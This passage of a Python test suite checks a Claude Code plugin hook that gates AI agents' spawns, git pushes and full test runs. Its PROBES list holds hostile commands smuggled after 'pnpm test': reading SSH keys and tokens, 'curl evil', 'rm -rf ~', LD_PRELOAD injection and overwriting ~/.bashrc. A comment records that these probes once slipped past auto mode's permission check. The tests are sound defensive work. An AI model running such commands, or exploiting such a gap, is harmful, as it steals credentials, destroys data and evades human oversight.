        self.assertIn("CLAUDE_CODE_EFFORT_LEVEL=low", both)
        self.assertIn("max effort", both)
        denied = json.loads(self.spawn(model="opus", env=forced).stdout)["hookSpecificOutput"]
        self.assertEqual(denied["permissionDecision"], "deny")  # still a deny, and it says the variable too
        self.assertIn("names no effort", denied["permissionDecisionReason"])
        self.assertIn("CLAUDE_CODE_EFFORT_LEVEL=low", denied["permissionDecisionReason"])
        for quiet in (self.spawn(subagent_type="fork", env=forced), self.spawn(model="opus", effort="high", env={"CLAUDE_CODE_EFFORT_LEVEL": " "})):
            self.assertEqual(quiet.stdout, "")
        (self.registry / "p.json").unlink()  # outside a fleet: nothing
        self.assertEqual(self.spawn(model="opus", effort="high", env=forced).stdout, "")

    def test_outside_a_fleet_nothing_is_said_even_in_tuca_mode(self):
        flag = self.data / "sessions" / "sess-1" / "tuca-mode"
        flag.parent.mkdir(parents=True)
        flag.write_text("")
        (self.registry / "p.json").unlink()
        for r in (self.spawn(model="opus"), self.spawn(), self.spawn(model="opus", effort="max"),
                  self.spawn(model="opus", effort="ultra")):
            self.assertEqual((r.stdout, r.stderr), ("", ""))
        self.register(self.fleet)  # and the flag changes nothing in one
        self.assertIn('"deny"', self.spawn(model="opus").stdout)

    def test_the_hook_never_allows_a_spawn(self):
        import inspect
        returns = re.findall(r"^\s+return (.*)$", inspect.getsource(load_hook().fleet_spawn_effort), re.M)
        self.assertTrue(returns)
        self.assertTrue(all(r == "None" or r.startswith(("Deny(", "Note(")) for r in returns), returns)
        probes = [{}, {"model": "opus"}, {"effort": "high"}, {"model": "opus", "effort": "high"},
                  {"model": "opus", "effort": "max"}, {"model": "opus", "effort": "nope"}, {"subagent_type": "fork"},
                  {"subagent_type": "tstack:advisor"}, {"subagent_type": "Explore"}, {"model": 7, "effort": ["high"]},
                  {"prompt": self.BRIEFED.format(dir=self.fleet)}, {"description": None, "prompt": None}]
        for probe in probes:
            with self.subTest(probe=probe):
                out = self.spawn(**probe).stdout
                decision = json.loads(out)["hookSpecificOutput"] if out else {}
                self.assertIn(decision.get("permissionDecision"), (None, "deny"))
                self.assertNotIn("updatedInput", decision)

    def test_a_granted_spawn_without_effort_is_still_denied(self):
        spawn = {"subagent_type": "general-purpose", "description": "do it", "prompt": "go"}
        rule = "Agent(" + json.dumps(spawn, sort_keys=True, ensure_ascii=False, separators=(",", ":")) + ")"
        (self.project / ".claude" / "tstack-grants.json").write_text(json.dumps({"permissions": {"allow": [rule]}}))
        self.assertIn("names no model and no effort.", self.denial())
        with_both = {**spawn, "model": "opus", "effort": "high"}
        rule = "Agent(" + json.dumps(with_both, sort_keys=True, ensure_ascii=False, separators=(",", ":")) + ")"
        (self.project / ".claude" / "tstack-grants.json").write_text(json.dumps({"permissions": {"allow": [rule]}}))
        self.assertIn('"allow"', self.spawn(model="opus", effort="high").stdout)  # fleet_agent_grant's, as before

    def test_odd_input_never_breaks_it(self):
        (self.fleet / "state.json").write_text('{"agents": [7, {"id": 3}, {"id": "a1", "model": 5, "skill": ["x"]}]}')
        self.assertIn(f"Pass model: \"opus\" and the effort `{self.fleet_cli} brief {self.fleet} a1` prints",
                      self.denial(prompt="your id is a1."))
        (self.fleet / "state.json").write_text("{broken")
        self.assertIn("Pass effort: per MODELS.md", self.denial())
        for extra in ({"tool_input": ["x"]}, {"tool_input": {}}, {"tool_input": None}, {"effort": "low"}, {"cwd": 3}):
            r = self.spawn(extra=extra)
            self.assertEqual(r.returncode, 0)
            self.assertNotIn('"allow"', r.stdout)
        self.assertEqual(self.log(), "")

    def test_without_models_md_the_denial_still_names_where_to_look(self):
        root = self.tmp / "plugin"
        (root / "hooks").mkdir(parents=True)
        shutil.copy(HOOK, root / "hooks" / "tstack-hook")
        r = subprocess.run([str(root / "hooks" / "tstack-hook"), "PreToolUse"], capture_output=True, text=True, timeout=30,
                           input=json.dumps(self.payload("PreToolUse", tool_name="Agent", tool_input={"prompt": "go"})),
                           env={**self.env, "CLAUDE_PLUGIN_ROOT": str(root)})
        reason = json.loads(r.stdout)["hookSpecificOutput"]["permissionDecisionReason"]
        self.assertIn(f"Pass effort: per MODELS.md ({root}/skills/productivity/coordinator/MODELS.md)", reason)

    def test_the_check_is_fast(self):
        module = load_hook()
        payload = self.payload("PreToolUse", tool_name="Agent", tool_input={"subagent_type": "general-purpose",
                               "model": "opus", "prompt": self.BRIEFED.format(dir=self.fleet)})
        hook = module.Hook("PreToolUse", payload, self.env)
        self.assertIsInstance(module.fleet_spawn_effort(hook), module.Deny)
        started = time.perf_counter()
        for _ in range(50):
            module.fleet_spawn_effort(module.Hook("PreToolUse", payload, self.env))
        self.assertLess((time.perf_counter() - started) * 1000 / 50, 20)


class PushParseTest(unittest.TestCase):
    """Reader.pushes: the pushes a shell line runs, where each runs, and whether the hook can read it."""

    def pushes(self, command, cwd="/w/home"):
        return [(p.tool, p.cwd, p.unclear) for p in load_hook().Reader().pushes(command, cwd)]

    def test_plain_pushes_are_read_through_cd_redirections_and_wrappers(self):
        for command, tool, cwd in (("cd ../app && jj git push -b master", "jj", "/w/app"),
                                   ("cd /r; jj -R sub git push --all", "jj", "/r"),
                                   ("jj git push -b master 2>&1", "jj", "/w/home"),
                                   ("jj git push -b master 2>&1 | tee /tmp/log", "jj", "/w/home"),
                                   ("git push origin master >/tmp/out </dev/null", "git", "/w/home"),
                                   ("git push origin master &>/dev/null", "git", "/w/home"),
                                   ("timeout 60 jj git push -b master", "jj", "/w/home"),
                                   ("timeout -s KILL 5m git push origin master", "git", "/w/home"),
                                   ("env -i PATH=/bin jj git push -b master", "jj", "/w/home"),
                                   ("/usr/bin/env FOO=1 git push origin master", "git", "/w/home"),
                                   ("nice -n 5 command git push origin master", "git", "/w/home"),
                                   ("bash -lc 'cd /r && jj git push'", "jj", "/r"),
                                   ("sh -c 'git push origin master'", "git", "/w/home"),
                                   ("nix shell nixpkgs#git --command git push origin master", "git", "/w/home"),
                                   ("devenv-run git push origin master", "git", "/w/home"),
                                   ("jj git -R /x push -b master", "jj", "/w/home")):
            with self.subTest(command=command):
                self.assertEqual(self.pushes(command), [(tool, cwd, False)])

    def test_a_push_the_hook_cannot_read_is_unclear(self):
        for command in ("for r in a b; do jj -R $r git push -b master; done",
                        "while true; do git push; done",
                        "if true; then git push origin master; fi",
                        "{ jj git push; }",
                        "(cd /x && jj git push)",
                        "x=$(git push origin master)",
                        'echo "$(jj git push)"',
                        "echo `git push`",
                        "eval 'jj git push -b master'",
                        "echo master | xargs jj git push -b",
                        "jj git push -b $BOOKMARK",
                        "cd $DIR && jj git push -b master"):
            with self.subTest(command=command):
                found = self.pushes(command)
                self.assertTrue(found, command)
                self.assertTrue(all(unclear for _, _, unclear in found), found)

    def test_what_is_not_a_push_is_left_alone(self):
        for command in ("jj git fetch && jj log", "echo push", "echo 'git push origin master'", "jj git push --dry-run -b master",
                        "git push -n origin master", "git log --grep push", "jj describe -m 'fix `jj git push` in the docs'",
                        "jj describe -m \"$(cat <<'EOF'\nhooks: why\n\ngit push origin master was not gated\nEOF\n)\"",
                        "git status # then git push", "unbalanced 'quote"):
            with self.subTest(command=command):
                self.assertEqual(self.pushes(command), [])

    def test_a_shell_script_that_pushes_is_unclear(self):
        with tempfile.TemporaryDirectory() as d:
            Path(d, "land.sh").write_text("#!/bin/sh\nset -e\njj git push --bookmark master\n")
            Path(d, "tool").write_text("#!/usr/bin/env python3\n# `jj git push` is not run here\n")
            Path(d, "notes.sh").write_text("#!/bin/sh\necho jj will not push it\n")
            self.assertEqual(self.pushes("./land.sh", d), [("script", d, True)])
            self.assertEqual(self.pushes("bash land.sh --fast", d), [("script", d, True)])
            self.assertEqual(self.pushes("./tool && ./notes.sh", d), [])


@unittest.skipUnless(shutil.which("jj") and shutil.which("git") and shutil.which("bun"), "needs jj, git and bun")
class LandTurnGateTest(FleetCase):
    """land_turn_gate (PreToolUse, Bash): in a fleet under a manager, a push to the landing bookmark on the landing
    remote, or a push the hook cannot read, is denied until the manager gave the fleet the landing turn (`fleet
    turn`, found by this test's pid, which the registry entry carries). Any other push goes through without asking
    the fleet CLI, and so does any session outside a managed fleet."""

    JJ = {"JJ_USER": "Test", "JJ_EMAIL": "test@example.com", "JJ_CONFIG": ""}

    def setUp(self):
        super().setUp()
        self.env.update(self.JJ, XDG_CONFIG_HOME=str(self.tmp / "config"))  # where jj keeps a repo's config
        remote = self.tmp / "remote.git"
        fork = self.tmp / "fork.git"
        for bare in (remote, fork):
            subprocess.run(["git", "init", "-q", "--bare", str(bare)], check=True)
        self.work = self.tmp / "work"
        self.jj("git", "init", "--colocate", str(self.work), cwd=self.tmp)
        self.jj("git", "remote", "add", "origin", str(remote))
        self.jj("git", "remote", "add", "fork", str(fork))
        (self.work / "a").write_text("a\n")
        self.jj("commit", "-m", "a")
        self.jj("bookmark", "set", "master", "-r", "@-")
        self.jj("git", "push", "--bookmark", "master")
        (self.work / "b").write_text("b\n")
        self.jj("commit", "-m", "b")
        self.jj("bookmark", "set", "master", "-r", "@-")
        self.jj("bookmark", "set", "feat", "-r", "@-")
        self.jj("config", "set", "--repo", "aliases.ship", '["git", "push", "--bookmark", "master"]')
        self.jj("config", "set", "--repo", "aliases.p", '["git", "push"]')
        subprocess.run(["git", "-C", str(self.work), "config", "alias.pub", "push origin HEAD:refs/heads/master"], check=True)
        self.calls = self.tmp / "cli-calls"

    def jj(self, *args, cwd=None):
        subprocess.run(["jj", *args], cwd=cwd or self.work, env={**os.environ, **self.env}, check=True,
                       capture_output=True)

    def manager(self, *steps):
        d = self.tmp / "manager"
        d.mkdir(exist_ok=True)
        (d / "state.json").write_text(json.dumps({
            "project": "manager", "goal": "g", "status": "running", "now": "", "role": "manager",
            "started": "2026-01-05T08:00:00+00:00", "agents": [], "roadblocks": [], "decisions": [], "events": [],
            "roadmap": [{"id": "landings", "title": "Landings and deploys",
                         "steps": [{"id": i, "title": f"{a}: push", "status": s, "agent": a} for i, s, a in steps]}]}))
        (self.registry / "manager.json").write_text(json.dumps({
            "id": "manager", "role": "manager", "dir": str(d), "url": "http://127.0.0.1:7420/f/manager/",
            "pid": os.getpid(), "session": None, "since": "2026-01-05T07:00:00+00:00"}))

    def hung_cli(self):
        """A fleet CLI that records each start and never answers."""
        cli = self.tmp / "hung-fleet"
        cli.write_text(f"#!/bin/sh\necho \"$@\" >>{self.calls}\nexec sleep 30\n")
        cli.chmod(0o755)
        return {"TSTACK_FLEET_CLI": str(cli), "TSTACK_TURN_TIMEOUT_S": "1"}

    def push(self, command, cwd=None, env=None):
        payload = {**self.payload("PreToolUse"), "tool_name": "Bash", "tool_input": {"command": command},
                   "cwd": str(cwd or self.work)}
        r = self.hook("PreToolUse", payload, env=env)
        self.assertEqual(r.returncode, 0, r.stderr)
        return r

    def denied(self, r):
        self.assertTrue(r.stdout, f"not denied; stderr: {r.stderr}; log: {self.log()}")
        decision = json.loads(r.stdout)["hookSpecificOutput"]
        self.assertEqual(decision["permissionDecision"], "deny")
        return decision["permissionDecisionReason"]

    def events(self):
        return [e for e in json.loads((self.fleet / "state.json").read_text())["events"] if e.get("kind") == "blocked"]

    def test_a_push_without_the_turn_is_denied_and_logged(self):
        self.manager(("l1", "current", "infra"), ("l2", "pending", "p"))
        reason = self.denied(self.push("jj git push --bookmark master"))
        self.assertIn("landing bookmark master", reason)
        self.assertIn("p doesn't hold the landing turn (fleet turn: p does not hold the landing turn (l1", reason)
        self.assertIn("yours, l2, waits in the queue", reason)
        self.assertIn("Luiz's approval to push doesn't skip the queue", reason)
        [event] = self.events()
        self.assertTrue(event.get("important"))
        self.assertIn("Push gate: refused `jj git push --bookmark master`", event["text"])

    def test_a_push_with_the_turn_is_allowed(self):
        self.manager(("l1", "done", "infra"), ("l2", "current", "p"))
        self.assertSilent(self.push("jj git push --bookmark master"))
        self.assertSilent(self.push("for r in a; do jj git push; done"))
        self.assertEqual(self.events(), [])

    def test_a_session_outside_a_managed_fleet_is_allowed(self):
        self.assertSilent(self.push("jj git push --bookmark master"))  # a fleet, no manager
        self.manager(("l1", "current", "infra"))
        (self.registry / "p.json").unlink()  # a manager, and this session serves no fleet
        self.assertSilent(self.push("jj git push --bookmark master"))
        self.assertSilent(self.push("eval 'jj git push'"))

    def test_a_fleet_cli_that_cannot_run_fails_open_with_a_warning(self):
        self.manager(("l1", "current", "infra"))
        r = self.push("jj git push --bookmark master", env={"TSTACK_FLEET_CLI": str(self.tmp / "no-fleet")})
        self.assertEqual(r.stdout, "")
        self.assertIn("could not be checked", r.stderr)
        self.assertEqual(self.events(), [])

    def test_a_hung_fleet_cli_is_started_for_a_landing_push_only(self):
        hung = self.hung_cli()
        for command in ("jj git push -b feat", "git push fork master", "git push --tags", "jj log"):
            self.assertSilent(self.push(command, env=hung))
        self.assertFalse(self.calls.exists())  # never asked
        started = time.monotonic()
        r = self.push("jj git push --bookmark master", env=hung)
        self.assertLess(time.monotonic() - started, 10)
        self.assertEqual(r.stdout, "")
        self.assertIn("could not be checked", r.stderr)
        self.assertEqual(self.calls.read_text().split(), ["turn"])

    def test_every_way_onto_the_landing_bookmark_is_gated(self):
        self.manager(("l1", "current", "infra"))
        elsewhere = self.tmp
        for command, cwd in ((f"cd {self.work} && jj git push -b master", elsewhere),
                             (f"cd {self.work}; jj git push", elsewhere),
                             (f"jj -R {self.work} git push --bookmark master", elsewhere),
                             ("jj git push -b master 2>&1", self.work),
                             ("jj git push -b master 2>&1 | tee push.log", self.work),
                             ("timeout 120 jj git push --bookmark master", self.work),
                             ("env -i PATH=\"$PATH\" git push origin master", self.work),
                             ("bash -lc 'jj git push --bookmark master'", self.work),
                             ("jj ship", self.work),
                             ("jj p -b master", self.work),
                             ("git pub", self.work),
                             ("git push origin HEAD:refs/heads/master", self.work),
                             (f"git -C {self.work} push origin HEAD:master", elsewhere),
                             ("git push origin master --tags", self.work),
                             ("jj git push --all", self.work)):
            with self.subTest(command=command):
                self.assertIn("landing bookmark master", self.denied(self.push(command, cwd=cwd)))
        self.assertEqual(len(self.events()), 15)

    def test_a_push_the_hook_cannot_read_is_denied_without_the_turn(self):
        self.manager(("l1", "current", "infra"))
        for command in ("for b in master; do jj git push -b $b; done", "echo master | xargs jj git push -b",
                        "eval 'git push origin master'", "jj git push -b $B", "(cd sub && jj git push)"):
            with self.subTest(command=command):
                reason = self.denied(self.push(command))
                self.assertIn("couldn't tell which bookmarks this push moves; run it as a plain "
                              "`jj git push --bookmark <b>` (or `git push origin <ref>`)", reason)
                self.assertIn("doesn't hold the landing turn", reason)

    def test_a_push_to_another_bookmark_remote_or_tags_is_allowed(self):
        self.manager(("l1", "current", "infra"))
        for command in ("jj git push -b feat", "jj p -b feat", "git push origin HEAD:refs/heads/feat", "jj git push -c @-",
                        "jj git push --remote fork -b master", "git push fork master", "git push --tags",
                        "git push origin --tags", "git push origin refs/tags/v1:refs/tags/v1",
                        "jj git push --dry-run -b master", "jj log -r master", "jj describe -m 'about `jj git push`'"):
            with self.subTest(command=command):
                self.assertSilent(self.push(command))
        self.assertEqual(self.events(), [])


class SuiteParseTest(unittest.TestCase):
    """SuiteReader: which Bash lines run a repo's whole test suite (gated) and which a scoped run (left alone)."""

    def setUp(self):
        self.mod = load_hook()
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        self.pkg = Path(self._tmp.name).resolve()
        (self.pkg / "package.json").write_text(json.dumps({"scripts": {
            "test": "vitest run", "test:workers": "vitest run --project workers", "test:one": "vitest run src/a.test.ts",
            "test:all": "pnpm run test:workers && pnpm run test:one", "build": "tsc -b", "check": "vp test"}}))
        (self.pkg / "app").mkdir()

    def suites(self, command, cwd=None):
        return [(s.what, s.unclear) for s in self.mod.SuiteReader().suites(command, str(cwd or self.pkg))]

    def test_whole_entry_points_are_full_suites(self):
        for command in ("pnpm test", "pnpm -r test", "pnpm --recursive run test", "pnpm --filter api test", "npm test",
                        "npm run test", "npm t", "yarn test", "vitest", "vitest run", "vitest -c vite.config.ts",
                        "vitest --project unit", "vp test", "vp test run", "just test", "just test --jobs 1", "bun test",
                        "just test-scripts", "just test-fleet", "just test-fleet-ts", "just test-page", "just test-coordinator",
                        "pytest", "pytest -x", "python3 -m pytest", "uv run pytest -q", "cargo test --lib",
                        "cargo test", "cargo test --workspace -p a", "cargo test -- --nocapture", "cargo nextest run",
                        "go test ./...", "go -C sub test ./...", "go test -v ./...",
                        "node --test", "npx vitest run", "pnpm exec vitest", "pnpm vitest run", "bunx vitest",
                        "python3 scripts/gates all", "./node_modules/.bin/vitest run"):
            with self.subTest(command=command):
                found = self.suites(command)
                self.assertTrue(found, command)
                self.assertFalse(any(unclear for _, unclear in found), found)

    def test_scoped_runs_are_not(self):
        for command in ("vitest run src/a.test.ts", "vitest src/a", "vitest --changed", "vitest --changed=HEAD~1",
                        "vitest related src/a.ts", "vitest run --dir packages/api", "vp test src/a.test.ts",
                        "pnpm test -- src/a.test.ts", "pnpm test src/a.test.ts", "npm run test -- --changed",
                        "just test-changed", "just test-coordinator-page", "just build-page", "bun test test/x.test.ts",
                        "bun test x", "bun test -t name", "vitest -t foo", "vitest run -t 'a b'", "vitest --testNamePattern=x",
                        "pnpm test -t parses", "npm test -- -t foo", "pytest -k foo", "pytest -kfoo", "pytest --lf",
                        "pytest --last-failed -x", "cargo test foo", "cargo test --lib foo", "cargo nextest run -E 'test(foo)'",
                        "cargo nextest run foo", "go test -run TestX ./...", "go test -run=TestX ./...",
                        "pytest tests/test_a.py", "pytest tests/", "pytest test_a.py -k b", "cargo test -p fleet",
                        "cargo test --package=fleet", "go test ./pkg/...", "go test ./pkg", "go test", "node --test a.test.mjs",
                        "python3 scripts/gates changed", "devenv-run vitest run src/a.test.ts", "pnpm build", "pnpm install",
                        "pnpm run build", "jj log", "echo pnpm test", "git commit -m 'make pnpm test pass'",
                        "systemd-run --user --scope -p MemoryMax=8G -- pnpm test", "vitest list", "cargo build"):
            with self.subTest(command=command):
                self.assertEqual(self.suites(command), [])

    def test_wrappers_redirections_and_cd_are_read_through(self):
        for command in ("timeout 600 pnpm test", "env CI=1 pnpm test", "CI=1 pnpm test", "nice -n 5 pnpm test",
                        "devenv-run pnpm test", "nix develop -c pnpm test", "pnpm test 2>&1 | tail -40",
                        "pnpm test >/tmp/out 2>&1", "cd app && cd .. && pnpm test", "bash -c 'pnpm test'",
                        "sh -lc 'cd app; vitest run'", f"pnpm -C {self.pkg} test:workers", f"cd /nowhere; pnpm --dir {self.pkg} run test:workers"):
            with self.subTest(command=command):
                self.assertTrue(self.suites(command, cwd=self.pkg), command)

    def test_package_json_scripts_that_run_a_whole_suite_are_full(self):
        for command in ("pnpm test:workers", "pnpm run test:workers", "npm run test:workers", "yarn test:workers",
                        "bun run test:workers", "pnpm test:all", "pnpm check", "vp run test:workers"):
            with self.subTest(command=command):
                [(what, unclear)] = self.suites(command)
                self.assertFalse(unclear)
        for command in ("pnpm test:one", "npm run test:one", "pnpm build", "pnpm run build", "pnpm test:workers -- src/a.test.ts"):
            with self.subTest(command=command):
                self.assertEqual(self.suites(command), [])
        self.assertIn("vitest run --project workers", self.suites("pnpm test:workers")[0][0])

    def test_an_unreadable_package_json_counts_a_test_named_script(self):
        (self.pkg / "package.json").write_text("{not json")
        self.assertTrue(self.suites("pnpm test:workers"))
        self.assertEqual(self.suites("pnpm build"), [])

    def test_a_runner_the_hook_cannot_read_is_unclear(self):
        (self.pkg / "ci.sh").write_text("#!/bin/sh\nset -e\npnpm test\n")
        (self.pkg / "lint.sh").write_text("#!/bin/sh\noxlint .\n")
        for command in ("eval 'pnpm test'", "x=$(vitest run)", "git diff --name-only | xargs vitest run", "./ci.sh",
                        "bash ci.sh", "source ci.sh", "unbalanced 'pytest"):
            with self.subTest(command=command):
                found = self.suites(command)
                self.assertTrue(found, command)
                self.assertTrue(all(unclear for _, unclear in found), found)
        self.assertEqual(self.suites("./lint.sh"), [])


class SuiteGateTest(FleetCase):
    """suite_gate (PreToolUse, Bash): in a managed fleet's session a full suite runs through the gate slot (`fleet fleets
    gate run`): the call is denied with the command to run, never allowed or rewritten, so the permission check
    reviews the command Claude issues next. Outside a managed fleet, nothing changes but a hint on stderr."""

    def setUp(self):
        super().setUp()
        (self.repo / "package.json").write_text(json.dumps({"scripts": {"test:workers": "vitest run --project workers"}}))

    def manager(self):
        d = self.tmp / "manager"
        d.mkdir(exist_ok=True)
        (d / "state.json").write_text(json.dumps({"project": "manager", "role": "manager"}))
        (self.registry / "manager.json").write_text(json.dumps({
            "id": "manager", "role": "manager", "dir": str(d), "url": "http://127.0.0.1:7420/f/manager/",
            "pid": os.getpid(), "session": None, "since": "2026-01-05T07:00:00+00:00"}))

    def run_bash(self, command, env=None, **more):
        payload = {**self.payload("PreToolUse"), "tool_name": "Bash",
                   "tool_input": {"command": command, "description": "tests", **more}}
        r = self.hook("PreToolUse", payload, env=env)
        self.assertEqual(r.returncode, 0, r.stderr)
        return r

    def decision(self, r):
        self.assertTrue(r.stdout, f"no decision; stderr: {r.stderr}; log: {self.log()}")
        return json.loads(r.stdout)["hookSpecificOutput"]

    def gate_run(self, inner):
        return f"{self.fleet_cli} fleets gate run --as p --wait 1800 -- {inner}"

    def test_a_full_suite_is_denied_with_the_gate_run_to_issue(self):
        self.manager()
        for command, inner in (("pnpm test", "pnpm test"), ("pnpm test:workers", "pnpm test:workers"),
                               ("just test --jobs 2", "just test --jobs 2"),
                               ("pnpm test 2>&1 | tail -40", "bash -c 'pnpm test 2>&1 | tail -40'"),
                               ("cd app && vitest run", "bash -c 'cd app && vitest run'"),
                               ("CI=1 pnpm test", "bash -c 'CI=1 pnpm test'"),
                               ("pnpm test; rm -rf dist", "bash -c 'pnpm test; rm -rf dist'"),
                               ("pnpm test # ; rm -rf ~", "bash -c 'pnpm test # ; rm -rf ~'")):
            with self.subTest(command=command):
                d = self.decision(self.run_bash(command))
                self.assertEqual(d["permissionDecision"], "deny")
                self.assertNotIn("updatedInput", d)
                self.assertIn(f"Run it as: `{self.gate_run(inner)}`", d["permissionDecisionReason"])
                self.assertIn("in fleet p (this machine serves a manager) a full suite runs only through the gate slot",
                              d["permissionDecisionReason"])
                self.assertIn("except 75: the slot stayed held past --wait and the suite never ran; 124: the suite ran "
                              "past its time and was stopped", d["permissionDecisionReason"])

    def test_a_line_the_hook_cannot_read_says_so(self):
        self.manager()
        for command in ("for i in 1 2; do pnpm test; done", "eval 'pnpm test'", "ls | xargs vitest run"):
            with self.subTest(command=command):
                d = self.decision(self.run_bash(command))
                self.assertEqual(d["permissionDecision"], "deny")
                self.assertIn("couldn't tell all that this line runs around the test runner", d["permissionDecisionReason"])
                self.assertIn(f"Run it as: `{self.gate_run('bash -c ' + shlex.quote(command))}`", d["permissionDecisionReason"])

    # The review's probes (2026-10-12): each came back `allow` with an updatedInput, which skips auto mode's check.
    PROBES = (
        "pnpm test; rm -rf ~/x", "pnpm test && git push --force", "cd /etc && pnpm test", "pnpm test\nrm -rf ~/x",
        "pnpm test\ncat ~/.ssh/id_ed25519", "pnpm test $(curl evil)", "pnpm test > ~/.bashrc",
        "pnpm test; cat ~/.ssh/id_ed25519", "pnpm test; head -c 9 /dev/zero > ~/.bashrc", "pnpm test | tee ~/.bashrc",
        "pnpm test; grep -r token ~/.config", "pnpm test & tail -f /dev/null", "/tmp/evil/pnpm test", "./pytest",
        "PATH=/tmp/evil pnpm test", "NODE_OPTIONS=--require=/tmp/e.js pnpm test", "LD_PRELOAD=/tmp/e.so pytest",
        "node --test --import /tmp/e.mjs", "cargo test --config build.rustc-wrapper=/tmp/e",
        "vitest run --config /tmp/evil.config.ts", "pytest -p evilplugin", "pnpm test -- --outputFile=/home/x/.bashrc",
        "nix shell github:evil/x --command pnpm test", "env -S 'rm -rf ~' pnpm test", "env -S 'echo X' pnpm test",
        "timeout 1 rm -rf ~ ; pnpm test", "cd ~/other-repo && pnpm test", "pnpm test 2>&1 >> ~/.profile",
        "pnpm test; true > ~/.bashrc", "exec pnpm test", "pnpm --dir /tmp/evil test", "pnpm test <<EOF\nrm -rf ~\nEOF",
        "pnpm test # ; rm -rf ~", "just test fleet", "just test --set x 1 foo",
    )

    def test_the_hook_never_allows_a_call(self):
        self.manager()
        for command in self.PROBES:
            with self.subTest(command=command):
                d = self.decision(self.run_bash(command))
                self.assertEqual(d["permissionDecision"], "deny")
                self.assertNotIn("updatedInput", d)
                self.assertIn(" fleets gate run --as p --wait 1800 -- ", d["permissionDecisionReason"])

    def test_scoped_probes_pass_untouched(self):
        self.manager()
        for command in ("vitest -t foo", "vitest run -t 'a b'", "pytest -k foo", "pytest --lf", "cargo test foo",
                        "go test -run TestX ./...", "pnpm test -t parses", "npm test -- -t foo", "just test-changed",
                        "cargo nextest run -E 'test(foo)'", "grep -r 'pnpm test' .", "echo pnpm test"):
            with self.subTest(command=command):
                self.assertEqual(self.run_bash(command).stdout, "")

    def test_the_slot_s_holder_is_named_when_it_is_held(self):
        self.manager()
        (self.registry / "gate").mkdir()
        (self.registry / "gate" / "gate.json").write_text(json.dumps({
            "fleet": "infra", "kind": "fleet", "what": "browser suite", "since": "2026-01-05T08:00:00+00:00",
            "until": "2999-01-01T00:00:00+00:00", "token": "abcd1234"}))
        d = self.decision(self.run_bash("pnpm test"))
        self.assertIn("The slot is held now (infra: browser suite), so it waits for it (up to 30 min)", d["permissionDecisionReason"])

    def test_a_gate_run_hold_whose_runner_is_gone_is_free(self):
        self.manager()
        (self.registry / "gate").mkdir()
        (self.registry / "gate" / "gate.json").write_text(json.dumps({
            "fleet": "w1", "kind": "session", "what": "gate run: just test", "since": "2026-01-05T08:00:00+00:00",
            "until": "2999-01-01T00:00:00+00:00", "token": "abcd1234", "pid": 2 ** 22 + 7}))
        d = self.decision(self.run_bash("pnpm test"))
        self.assertNotIn("The slot is held now", d["permissionDecisionReason"])

    def test_scoped_runs_and_gated_lines_pass(self):
        self.manager()
        for command in ("vitest run src/a.test.ts", "pnpm test -- src/a.test.ts", "just test-changed", "jj log",
                        f"{self.fleet_cli} fleets gate run --as p --wait 1800 -- pnpm test",
                        "fleet fleets gate take p 'just test' && just test",
                        "systemd-run --user --scope -p MemoryMax=8G -- pnpm test"):
            with self.subTest(command=command):
                r = self.run_bash(command)
                self.assertEqual(r.stdout, "", r.stdout)

    def test_outside_a_managed_fleet_only_a_hint_on_stderr(self):
        r = self.run_bash("pnpm test")  # a fleet, no manager
        self.assertEqual(r.stdout, "")
        self.assertIn("runs a whole test suite", r.stderr)
        self.assertIn("fleets gate run --as <name> -- <command>", r.stderr)
        r = self.run_bash("pnpm test", env={"CLAUDE_CODE_SESSION_ATTENDED": "0"})  # headless: nothing at all
        self.assertEqual((r.stdout, r.stderr), ("", ""))
        self.manager()
        (self.registry / "p.json").unlink()  # a manager, and this session serves no fleet
        r = self.run_bash("pnpm test")
        self.assertEqual(r.stdout, "")
        self.assertIn("runs a whole test suite", r.stderr)

    def test_a_dead_manager_does_not_manage(self):
        self.manager()
        entry = json.loads((self.registry / "manager.json").read_text())
        done = subprocess.run(["true"])
        entry["pid"] = 2 ** 22 + 7  # no such process
        (self.registry / "manager.json").write_text(json.dumps(entry))
        self.assertEqual(done.returncode, 0)
        self.assertEqual(self.run_bash("pnpm test").stdout, "")

    def test_the_fleet_is_found_by_fleet_dir_too(self):
        self.manager()
        other = self.tmp / "other"
        other.mkdir()
        (other / "state.json").write_text("{}")
        (self.registry / "ui.json").write_text(json.dumps({"id": "ui", "role": "coordinator", "dir": str(other),
                                                           "pid": os.getpid(), "since": "2026-01-05T09:00:00+00:00"}))
        d = self.decision(self.run_bash("pnpm test", env={"FLEET_DIR": str(other)}))
        self.assertIn("--as ui ", d["permissionDecisionReason"])


class PreToolUseDecisionTest(unittest.TestCase):
    """Only fleet_agent_grant's Allow allows a call: a gate's text (land_turn_gate, suite_gate, fleet_spawn_effort)
    denies, notes or says nothing, so auto mode's permission check is never skipped for a Bash command or a spawn."""

    def setUp(self):
        self.mod = load_hook()
        self.saved = self.mod.HANDLERS["PreToolUse"]
        self.addCleanup(lambda: self.mod.HANDLERS.__setitem__("PreToolUse", self.saved))

    def decide(self, *handlers):
        self.mod.HANDLERS["PreToolUse"] = list(handlers)
        out = self.mod.dispatch("PreToolUse", json.dumps({"tool_name": "Bash", "tool_input": {"command": "x"}}),
                                {"HOME": tempfile.gettempdir()})
        return json.loads(out)["hookSpecificOutput"]["permissionDecision"] if out else None

    def test_plain_text_decides_nothing(self):
        self.assertIsNone(self.decide(lambda hook: "tstack: a note"))

    def test_a_deny_wins_and_an_allow_comes_only_from_allow(self):
        self.assertEqual(self.decide(lambda hook: self.mod.Allow("granted")), "allow")
        self.assertEqual(self.decide(lambda hook: self.mod.Allow("granted"), lambda hook: self.mod.Deny("no")), "deny")

    def test_a_note_is_context_with_no_decision_and_a_deny_or_an_allow_drops_it(self):
        self.mod.HANDLERS["PreToolUse"] = [lambda hook: self.mod.Note("mind this")]
        out = json.loads(self.mod.dispatch("PreToolUse", "{}", {"HOME": tempfile.gettempdir()}))
        self.assertEqual(out, {"hookSpecificOutput": {"hookEventName": "PreToolUse", "additionalContext": "mind this"}})
        self.assertEqual(self.decide(lambda hook: self.mod.Note("mind"), lambda hook: self.mod.Deny("no")), "deny")
        self.assertEqual(self.decide(lambda hook: self.mod.Note("mind"), lambda hook: self.mod.Allow("yes")), "allow")

    def test_the_gates_return_only_a_deny(self):
        import inspect
        for gate in (self.mod.land_turn_gate, self.mod.suite_gate):
            with self.subTest(gate=gate.__name__):
                returns = re.findall(r"^\s+return (.*)$", inspect.getsource(gate), re.M)
                self.assertTrue(returns)
                self.assertTrue(all(r == "None" or r.startswith("Deny(") for r in returns), returns)


class HooksJsonTest(unittest.TestCase):
